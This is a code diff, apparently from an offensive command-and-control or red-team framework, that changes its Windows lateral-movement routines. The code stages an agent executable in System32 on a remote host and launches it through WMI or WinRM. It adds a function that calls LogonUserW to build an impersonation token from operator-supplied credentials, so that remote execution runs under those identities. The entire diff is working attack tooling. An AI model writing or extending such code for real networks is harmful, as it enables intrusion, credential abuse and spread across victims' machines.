@@ -132,7 +132,7 @@ func lateralMoveWithProgress(payload lateralPayload, publish func(string)) (stri
 			}
 			localPath := `C:\Windows\System32\` + binaryName
 			agentCommand := lateralAgentCommand(localPath, targetSession, payload.WorkspaceID, serviceName)
-			if err := wmiCreateProcess(payload.Host, agentCommand); err != nil {
+			if err := wmiCreateProcess(payload.Host, agentCommand, payload.winrmIdentity); err != nil {
 				// The staged executable belongs to this deployment only: remove it
 				// instead of leaving an untracked artifact on the target.
 				if rollbackErr := os.Remove(sharePath); rollbackErr != nil && !os.IsNotExist(rollbackErr) {
@@ -592,7 +592,7 @@ func runLateralThreadWithCleanup(ctx context.Context, payload lateralPayload, mo
 		workerDone()
 		return "", err
 	}
-	token, identity, err := captureLateralIdentity(payload.Method == "winrm")
+	token, identity, err := captureLateralWorkerIdentity(payload)
 	if err != nil {
 		workerDone()
 		return "", err
@@ -658,6 +658,63 @@ func runLateralThreadWithCleanup(ctx context.Context, payload lateralPayload, mo
 func captureLateralToken() (syscall.Token, error) {
 	token, _, err := captureLateralIdentity(false)
 	return token, err
+}
+
+// captureLateralWorkerIdentity selects the worker's identity for one
+// deployment. Operator-supplied credentials in the payload take precedence:
+// they log on as a network-only token (no privilege required) so both the
+// thread impersonation for SMB staging and the explicit credential plumbing
+// of the WMI and WinRM chains carry them. Without them the ambient make_token
+// state remains the fallback, but wmiexec also consumes the stored make_token
+// credentials: the in-process WMI client keeps authentication state from the
+// first remote connection, and a cloaked network-only thread identity fails
+// the second ConnectServer with E_ACCESSDENIED. Passing the credentials
+// explicitly rebuilds the DCOM authentication for every deployment, the
+// documented WMI pattern and the one the WinRM chain already uses.
+// Deployments without a token keep the ambient process identity.
+func captureLateralWorkerIdentity(payload lateralPayload) (syscall.Token, *winrmCredentials, error) {
+	if payload.Identity != nil {
+		return captureLateralExplicitIdentity(winrmCredentials{
+			domain: payload.Identity.Domain, user: payload.Identity.User, password: payload.Identity.Password,
+		})
+	}
+	return captureLateralIdentity(payload.Method == "winrm" || payload.Method == "wmiexec")
+}
+
+// captureLateralExplicitIdentity creates a LOGON32_LOGON_NEW_CREDENTIALS
+// token from operator-supplied credentials. The logon type does not validate
+// the password, matching make_token semantics; the worker thread impersonates
+// the returned token while the WMI chain also receives the credentials
+// explicitly at ConnectServer and the proxy blanket, and the WinRM chain
+// passes them to WSManCreateSession. Credential material never appears in
+// the returned error text.
+func captureLateralExplicitIdentity(creds winrmCredentials) (syscall.Token, *winrmCredentials, error) {
+	userPtr, err := syscall.UTF16PtrFromString(creds.user)
+	if err != nil {
+		return 0, nil, errors.New("encode lateral identity user")
+	}
+	domainPtr, err := syscall.UTF16PtrFromString(creds.domain)
+	if err != nil {
+		return 0, nil, errors.New("encode lateral identity domain")
+	}
+	passwordPtr, err := syscall.UTF16PtrFromString(creds.password)
+	if err != nil {
+		return 0, nil, errors.New("encode lateral identity password")
+	}
+	var handle syscall.Handle
+	result, _, callErr := procLogonUserW.Call(
+		uintptr(unsafe.Pointer(userPtr)),
+		uintptr(unsafe.Pointer(domainPtr)),
+		uintptr(unsafe.Pointer(passwordPtr)),
+		uintptr(logonNewCredentials),
+		uintptr(logonProviderWinNT32),
+		uintptr(unsafe.Pointer(&handle)),
+	)
+	runtime.KeepAlive(passwordPtr)
+	if result == 0 {
+		return 0, nil, fmt.Errorf("LogonUserW for lateral identity: %w", callErr)
+	}
+	return syscall.Token(handle), &creds, nil
 }
 
 // captureLateralIdentity captures token and optional WinRM credentials under
